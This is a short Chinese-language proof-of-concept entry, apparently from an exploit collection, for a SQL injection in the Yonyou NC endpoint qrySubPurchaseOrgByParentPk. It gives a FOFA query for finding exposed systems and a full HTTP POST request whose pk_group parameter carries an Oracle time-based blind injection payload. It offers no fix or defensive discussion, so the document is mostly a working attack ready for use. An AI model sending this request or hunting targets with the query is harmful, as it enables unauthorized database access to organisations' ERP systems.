## 用友NC qrySubPurchaseOrgByParentPk SQL注入漏洞

## 漏洞描述
用友 NC `qrySubPurchaseOrgByParentPk` 接口存在 SQL 注入，攻击者可未经授权执行数据库语句。

## 网络空间测绘
```
fofa: app="用友-UFIDA-NC"
```

## POC
```
POST /ebvp/register/qrySubPurchaseOrgByParentPk HTTP/1.1
Host: [请补充实际域名]
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Connection: close

pk_group=1' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('RDS',5) -- 
```

## 参考
- 社区情报

